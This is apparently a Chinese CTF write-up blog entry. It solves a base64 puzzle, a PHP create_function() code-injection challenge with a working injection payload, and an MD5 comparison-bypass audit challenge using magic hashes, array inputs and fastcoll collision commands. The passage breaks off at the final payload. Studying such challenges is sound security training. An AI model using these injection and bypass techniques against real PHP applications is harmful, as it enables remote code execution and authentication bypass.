"VmxSS05HSXhXbkpOV0VwT1YwVmFWRll3Wkc5VVJsbDNWMnhhYkZac1NqQlpNRll3VlRBeFNWRnNjRmRpUmtwSVZsY3hSMk14V2xsalJsSnBVakpvV0ZaR1dsWmxSbHBYWWtSYVZtRjZWbGRVVmxwelRrWmFTR1ZHWkZSaGVrWlhWR3hTVjFZeVJuSlhiRUpYWVRGYVYxcFhlRkprTVZaeVkwZHNVMDFWY0ZkV2JURXdWREZSZUZkcmFGVmlhelZvVlcxNFMxWXhjRlpXVkVaUFlrYzVObGt3VmpCWFJrcHpWbXBTVjFadFVqTldiWE4zWkRKT1IySkdaRmRTVm5CUVZtMTBhMVJyTVVkVmJrcFZZa2RTVDFac1VsZFdNVlY0Vld0a1ZVMXNXbGhXTVdodlZsZEtSMU5yWkZWV1JVVXhWV3hhWVZkSFZraGtSbVJUWWtoQ1JsWnJaRFJWTWtaMFUydG9WbUpHV2xoV01HUnZWVVp3V0UxWGNHeFdhelY2V1ZWYVlWUnNXbkpYYm1oWFlrWktVRlY2Um10U01WcFpZVVpXVjJKRmNIaFdSM1JXVFZVd2QyTkdWbFZoTVZwTVZtdFZNVkpuSlRORUpUTkU="def get_password(s): i = 1 k = '' while(i &lt;= len(s)): k = k + s[i-1:i] i = i + (i%5) return kpassword = get_password(re_string)print(get_password(password)) 快速计算的那个也可以用正则表达式，这里用的是beautifulsoup解析，根据他class=rep这个唯一特征。 not easy代码审计的题目 123456789101112131415&lt;?phperror_reporting(0);if(isset($_GET['action'])) &#123; $action = $_GET['action'];&#125;if(isset($_GET['action']))&#123; $arg = $_GET['arg'];&#125;if(preg_match('/^[a-z0-9_]*$/isD', $action))&#123; show_source(__FILE__);&#125; else &#123; $action($arg,'');&#125; 这一题是create_function()注入。正则表达式中/i不区分大小写，/s匹配任何不可见字符，/D如果使用$限制结尾字符，则不允许结尾有换行。相当于在不允许使用数字字母下划线的情况下，调用函数。 这里使用的绕过方案是在函数前面加一个 \ ，P神在小密圈的解释 php里默认命名空间是 \，所有原生函数和类都在这个命名空间中。普通调用一个函数，如果直接写函数名function_name()调用，调用的时候其实相当于写了一个相对路径；而如果写\function_name() 这样调用函数，则其实是写了一个绝对路径。 如果你在其他namespace里调用系统类，就必须写绝对路径这种写法。 对于create_function()，官方给的解释如下图 以如下代码为例 12345678&lt;?php$newfunc = create_function('$a,$b', 'return "ln($a) + ln($b) = " . log($a * $b);');echo "New anonymous function: $newfunc\n";echo $newfunc(2, M_E) . "\n";// outputs// New anonymous function: lambda_1// ln(2) + ln(2.718281828459) = 1.6931471805599?&gt; 第一行代码等价于 12345eval(function __lambda_func($a, $b)&#123; return "ln($a) + ln($b) = " . log($a * $b); &#125;) 在本题中，构造$action=\create_function，$action($arg,’’); 即为： 123function lambda_1($arg)&#123; '';&#125; 构造$arg=){}print_r(scandir(‘./‘));/*，即可。 audit又是代码审计 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162&lt;?phphighlight_file(__FILE__);include(&apos;flag.php&apos;);$str1 = @$_GET[&apos;str1&apos;];$str2 = @$_GET[&apos;str2&apos;];$str3 = @$_GET[&apos;str3&apos;];$str4 = @$_GET[&apos;str4&apos;];$str5 = (string)@$_POST[&apos;str5&apos;];$str6 = (string)@$_POST[&apos;str6&apos;];$str7 = (string)@$_POST[&apos;str7&apos;];if( $str1 == $str2 )&#123; die(&apos;str1 OR Sstr2 no no no&apos;);&#125;if( md5($str1) != md5($str2) )&#123; die(&apos;step 1 fail&apos;);&#125;if( $str3 == $str4 )&#123; die(&apos;str3 OR str4 no no no&apos;);&#125;if ( md5($str3) !== md5($str4))&#123; die(&apos;step 2 fail&apos;);&#125;if( $str5 == $str6 || $str5 == $str7 || $str6 == $str7 )&#123; die(&apos;str5 OR str6 OR str7 no no no&apos;);&#125;if (md5($str5) !== md5($str6) || md5($str6) !== md5($str7) || md5($str5) !== md5($str7))&#123; die(&apos;step 3 fail&apos;);&#125;if(!($_POST[&apos;a&apos;]) and !($_POST[&apos;b&apos;]))&#123; echo &quot;come on!&quot;; die();&#125;$a = $_POST[&apos;a&apos;];$b = $_POST[&apos;b&apos;];$m = $_GET[&apos;m&apos;];$n = $_GET[&apos;n&apos;];if (!(ctype_upper($a)) || !(is_numeric($b)) || (strlen($b) &gt; 6)) &#123; echo &quot;a OR b fail!&quot;; die();&#125;if ((strlen($m) &gt; 4) || (strlen($n) &gt; 4)) &#123; echo &quot;m OR n fail&quot;; die();&#125;$str8 = hash(&apos;md5&apos;, $a, false);$str9 = strtr(hash(&apos;md5&apos;, $b, false), $m, $n);echo &quot;&lt;p&gt;str8 : $str8&lt;/p&gt;&quot;;echo &quot;&lt;p&gt;str9 : $str9&lt;/p&gt;&quot;;if (($str8 == $str9) &amp;&amp; !($a === $b) &amp;&amp; (strlen($b) === 6))&#123; echo &quot;You&apos;re great,give you flag:&quot;; echo $flag;&#125; 第一部分 str1和str2进行md5弱比较，以0e开头的会被识别为科学计数法，结果均为0 str3和str4进行md5强比较，传入数组绕过 str5，str6，str7只能进行md5碰撞，需要生成三个md5相同的文件绕过 参考这篇文章：基于全等的MD5碰撞绕过 1234567D:\fastcoll&gt;fastcoll_v1.0.0.5.exe -o test0.txt test1.txt //-o参数代表随机生成两个相同MD5的文件D:\fastcoll&gt;fastcoll_v1.0.0.5.exe -p test1.txt -o test00.txt test01.txt//-p参数代表根据test1.txt文件随机生成两个相同MD5的文件，注意：生成的MD5与test1.txt不同D:\fastcoll&gt;tail.exe -c 128 test00.txt &gt; a.txt //-c 128代表将test00.txt的最后128位写入文件a，这128位正是test1.txt与test00.txt的MD5不同的原因D:\fastcoll&gt;tail.exe -c 128 test01.txt &gt; b.txt //同理D:\fastcoll&gt;type test0.txt a.txt &gt; test10.txt //这里表示将test0.txt和a.txt文件的内容合并写入test10.txtD:\fastcoll&gt;type test0.txt b.txt &gt; test11.txt //同理写入test11.txt 然后对生成的文件进行URL编码，参考这篇文章：如何用不同的数值构建一样的MD5 1234567891011121314151617&lt;?php function readmyfile($path)&#123; $fh = fopen($path, "rb"); $data = fread($fh, filesize($path)); fclose($fh); return $data;&#125;echo 'test01 '. urlencode(readmyfile("test01.txt"));echo "&lt;br&gt;&lt;br&gt;\r\n";echo 'test00 '. urlencode(readmyfile("test00.txt"));echo "&lt;br&gt;&lt;br&gt;\r\n";echo 'test10 '. urlencode(readmyfile("test10.txt"));echo "&lt;br&gt;&lt;br&gt;\r\n";echo 'test11 '. urlencode(readmyfile("test11.txt"));echo "&lt;br&gt;&lt;br&gt;\r\n";?&gt; 第二部分 a是大写字母，b是数字且长度不大于6 GET得到的m和n的长度不大于4 str8为a的md5值 str9为b的md5值中的字符m替换为n ($str8 == $str9) &amp;&amp; !($a === $b) &amp;&amp; (strlen($b) === 6)，b长度必须为6，a不等于6，a的md5和b的md5替换后的值相同 这里使用0e绕过，a的值很明显为QNKCDZO b的值可以利用这个替换，将一些可能的值替换为我们需要的，is_numeric()函数接受16进制，会把16进制认为是数字，写个脚本找出0e开头的十六进制，然后找出有不大于5个字母数的md5 12345678910import hashlibfor i in range(1000,10000): k = "0x"+str(i) md5_n = hashlib.md5(k.encode()).hexdigest() if md5_n[0:2] == "0e": print(k) print(md5_n) 结果如图，选择0x6156 0ec4899c94ada8d08a6ada8623c6ff01 构造payload：]]></content>
      <categories>
        <category>CTF wp</category>
      </categories>
      <tags>
        <tag>wp</tag>
        <tag>JACTF</tag>
      </tags>
  </entry>
</search>
